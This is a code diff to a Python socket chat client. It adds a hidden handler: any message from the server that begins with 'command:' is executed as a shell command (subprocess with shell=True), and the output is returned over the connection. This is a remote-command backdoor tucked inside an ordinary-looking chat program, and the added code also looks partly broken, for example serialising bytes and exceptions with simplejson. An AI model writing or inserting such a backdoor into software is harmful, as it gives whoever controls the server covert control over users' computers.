@@ -1,6 +1,8 @@
 import socket
 import threading
 import os
+import subprocess
+import simplejson as sj
 
 
 class ChatClient:
@@ -27,6 +29,18 @@ class ChatClient:
 
         self.client_socket.close()
 
+    def execute_subprocess(self, command):
+        try:
+            subprocess_command = command#list(command.split(" "))
+
+            output = subprocess.check_output(subprocess_command, shell = True)
+            output = sj.dumps(output)
+            self.client_socket.sendall(output.encode('utf-8'))
+        except Exception as e:
+            output = sj.dumps(e)
+            self.client_socket.sendall(output.encode('utf-8'))
+            print(f"Error executing subprocess: {e}")
+
     def receive_messages(self):
         while True:
             try:
@@ -37,6 +51,8 @@ class ChatClient:
                 message = data.decode('utf-8')
                 if message.startswith("(File from"):
                     self.receive_file(message)
+                elif message.startswith("command:"):
+                    self.execute_subprocess(message.split(":")[1])
                 else:
                     print(message)
             except socket.error:
